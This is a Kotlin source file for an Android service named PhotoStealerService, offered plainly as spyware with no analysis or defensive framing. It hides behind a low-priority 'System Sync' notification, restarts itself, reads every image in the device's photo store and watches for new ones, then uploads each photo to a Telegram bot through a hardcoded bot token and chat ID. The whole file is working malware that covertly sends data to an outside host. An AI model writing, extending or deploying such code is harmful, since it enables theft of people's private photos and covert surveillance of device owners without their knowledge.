package com.example.photostealer

import android.app.*
import android.content.Intent
import android.database.ContentObserver
import android.os.*
import android.provider.MediaStore
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.Executors

class PhotoStealerService : Service() {

    private val TAG = "PhotoStealerService"
    private val botToken = "7690578068:AAHYNN_bL1uvgeAV6tzjuw4MnhOuzaHgWiw"
    private val chatId = "6827204922"
    private val sentImages = mutableSetOf<String>()
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        val notification = Notification.Builder(this, "stealer")
            .setContentTitle("System Sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()

        startForeground(1, notification)

        stealExistingImages()
        registerObserver()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?) = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel("stealer", "System Sync", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun stealExistingImages() {
        executor.execute {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                val columnIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                while (it.moveToNext()) {
                    val path = it.getString(columnIndex)
                    if (!sentImages.contains(path)) {
                        val file = File(path)
                        if (file.exists()) {
                            sendImageToTelegram(file)
                            sentImages.add(path)
                        }
                    }
                }
            }
        }
    }

    private fun registerObserver() {
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    Log.d(TAG, "New image detected.")
                    stealExistingImages()
                }
            }
        )
    }

    private fun sendImageToTelegram(imageFile: File) {
        val url = "https://api.telegram.org/bot$botToken/sendPhoto"
        val client = OkHttpClient()

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart(
                "photo",
                imageFile.name,
                imageFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            ).build()

        val request = Request.Builder().url(url).post(requestBody).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Send failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d(TAG, "Sent: ${imageFile.name}")
                } else {
                    Log.e(TAG, "Error: ${response.body?.string()}")
                }
            }
        })
    }
}
